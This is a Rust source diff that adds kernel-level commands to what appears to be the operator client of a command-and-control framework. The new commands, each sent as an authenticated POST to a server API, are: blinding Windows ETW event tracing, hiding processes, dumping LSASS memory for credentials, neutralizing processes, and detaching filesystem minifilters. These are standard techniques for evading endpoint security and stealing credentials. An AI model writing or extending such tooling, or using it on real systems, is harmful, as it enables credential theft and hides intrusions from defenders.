@@ -280,6 +280,13 @@ pub enum Cmd {
     FetchProfile,
     /// Close a relay channel (`Command::ChannelClose`).
     CloseChan { chan: u32 },
+    // ---- Kernel daemon ops (P6) ----
+    KernelStatus,
+    KernelBlindEtw,
+    KernelHide { pid: u32 },
+    KernelDumpLsass { pid: u32 },
+    KernelNeutralize { pid: u32 },
+    KernelDetachMinifilter,
     /// Stop the worker thread.
     Shutdown,
 }
@@ -1378,6 +1385,66 @@ async fn worker_loop(
                         Err(e) => {
                             log_push(&mut log_buf, &format!("! tasks fetch: {e}"), Level::Err)
                         }
+                    }
+                }
+                Cmd::KernelStatus => {
+                    let Some((ref srv, ref tok)) = server else { continue; };
+                    match authed(client.get(format!("{srv}/api/kernel/status")), tok).send().await {
+                        Ok(r) => match r.json::<serde_json::Value>().await {
+                            Ok(v) => log_push(&mut log_buf, &format!("kernel: {v}"), Level::Info),
+                            Err(e) => log_push(&mut log_buf, &format!("! kernel: {e}"), Level::Err),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! kernel: {e}"), Level::Err),
+                    }
+                }
+                Cmd::KernelBlindEtw => {
+                    let Some((ref srv, ref tok)) = server else { continue; };
+                    match authed(client.post(format!("{srv}/api/kernel/blind-etw")), tok).send().await {
+                        Ok(r) => match r.json::<serde_json::Value>().await {
+                            Ok(v) => log_push(&mut log_buf, &format!("blind-etw: {v}"), Level::Info),
+                            Err(e) => log_push(&mut log_buf, &format!("! blind-etw: {e}"), Level::Err),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! blind-etw: {e}"), Level::Err),
+                    }
+                }
+                Cmd::KernelHide { pid } => {
+                    let Some((ref srv, ref tok)) = server else { continue; };
+                    match authed(client.post(format!("{srv}/api/kernel/hide?pid={pid}")), tok).send().await {
+                        Ok(r) => match r.json::<serde_json::Value>().await {
+                            Ok(v) => log_push(&mut log_buf, &format!("hide {pid}: {v}"), Level::Info),
+                            Err(e) => log_push(&mut log_buf, &format!("! hide: {e}"), Level::Err),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! hide: {e}"), Level::Err),
+                    }
+                }
+                Cmd::KernelDumpLsass { pid } => {
+                    let Some((ref srv, ref tok)) = server else { continue; };
+                    match authed(client.post(format!("{srv}/api/kernel/dump-lsass?pid={pid}")), tok).send().await {
+                        Ok(r) => match r.json::<serde_json::Value>().await {
+                            Ok(v) => log_push(&mut log_buf, &format!("dump-lsass {pid}: {v}"), Level::Info),
+                            Err(e) => log_push(&mut log_buf, &format!("! dump-lsass: {e}"), Level::Err),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! dump-lsass: {e}"), Level::Err),
+                    }
+                }
+                Cmd::KernelNeutralize { pid } => {
+                    let Some((ref srv, ref tok)) = server else { continue; };
+                    match authed(client.post(format!("{srv}/api/kernel/neutralize?pid={pid}")), tok).send().await {
+                        Ok(r) => match r.json::<serde_json::Value>().await {
+                            Ok(v) => log_push(&mut log_buf, &format!("neutralize {pid}: {v}"), Level::Info),
+                            Err(e) => log_push(&mut log_buf, &format!("! neutralize: {e}"), Level::Err),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! neutralize: {e}"), Level::Err),
+                    }
+                }
+                Cmd::KernelDetachMinifilter => {
+                    let Some((ref srv, ref tok)) = server else { continue; };
+                    match authed(client.post(format!("{srv}/api/kernel/detach-minifilter")), tok).send().await {
+                        Ok(r) => match r.json::<serde_json::Value>().await {
+                            Ok(v) => log_push(&mut log_buf, &format!("detach-minifilter: {v}"), Level::Info),
+                            Err(e) => log_push(&mut log_buf, &format!("! detach-mf: {e}"), Level::Err),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! detach-mf: {e}"), Level::Err),
                     }
                 }
             }
